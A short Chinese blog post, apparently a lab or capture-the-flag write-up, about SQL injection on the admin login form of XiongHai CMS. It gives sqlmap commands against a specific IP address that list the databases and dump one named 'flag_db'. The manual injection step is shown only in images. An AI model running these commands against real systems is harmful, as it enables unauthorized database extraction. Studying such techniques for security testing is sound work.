---
title: "熊海 CMS 后台登录的 SQL 注入"
date: 2024-02-12
description: "管理员登录页面可以在不登陆的情况下用 SQL 注入泄露数据库信息"
tags: ["SQL注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

## 手工注入

![sqli4](/images/sqli1/sqli4-4.png)


## 用 sqlmap 扫描

使用的 sqlmap 语句如下。--forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。

    sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs

--dbs 的意思是列出所有数据库名称

    sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch -D flag_db --dump

-D 是指定数据库，--dump 是以文件形式导出。

![sqli4](/images/sqli1/sqli4-0.png)

![sqli4](/images/sqli1/sqli4-1.png)

![sqli4](/images/sqli1/sqli4-2.png)